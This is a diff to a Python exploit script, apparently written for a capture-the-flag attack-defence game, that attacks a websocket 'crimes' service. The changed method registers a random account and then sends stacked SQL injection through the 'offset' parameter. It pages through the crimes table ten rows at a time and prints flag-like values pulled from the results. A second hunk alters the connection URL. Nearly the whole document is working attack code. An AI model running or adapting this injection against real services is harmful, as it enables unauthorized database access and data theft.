@@ -65,23 +65,30 @@ class Client(object):
         username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
         self.register(username, password)
         self.auth(username, password)
-        self.ws.send(dumps(
-            {'action': 'show_crimes',
-             'params': {'offset': "0; select crimeid, name, description, "
-                                  "city, country, crimedate, public "
-                                  "from crimes LIMIT 10 --"}}))
-        answer = loads(self.ws.recv())
-        while 'text' in answer and 'New crime' in answer['text']:
+        flags = set()
+        for offset in range(10):
+            self.ws.send(dumps(
+                {'action': 'show_crimes',
+                 'params': {'offset': "0; select crimeid, name, description, "
+                                      "city, country, crimedate, public "
+                                      "from crimes WHERE description "
+                                      "LIKE '%%%%=' "
+                                      "LIMIT 10 OFFSET %s --"
+                                      % (offset * 10) }}))
             answer = loads(self.ws.recv())
-
-        if ("rows" in answer and
-                "data" in answer['rows'][0]):
-            crimes = answer['rows'][0]['data']
-            print(len(crimes))
-            for crime in crimes:
-                print(crime['article'].split()[-1])
-        else:
-            print(answer, file=stderr)
+            while 'text' in answer and 'New crime' in answer['text']:
+                answer = loads(self.ws.recv())
+    
+            if ("rows" in answer and
+                    "data" in answer['rows'][0]):
+                crimes = answer['rows'][0]['data']
+                for crime in crimes:
+                    flag = crime['article'].split()[-1]
+                    if flag[-1] == "=" and flag not in flags:
+                        print(flag)
+                        flags.add(flag)
+            else:
+                print(answer, file=stderr)
 
     def sploit_profile(self):
         username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
@@ -159,7 +166,7 @@ if __name__ == '__main__':
               "right after someone get opens participant profile\n"
               "" % argv[0])
     try:
-        ws = create_connection("ws://%s:1984/websocket" % argv[2])
+        ws = create_connection("ws://%s/websocket" % argv[2])
         ws.send(dumps({"action": "hello"}))
         answer = loads(ws.recv())
         if answer['rows'][0]['view'] != "form":
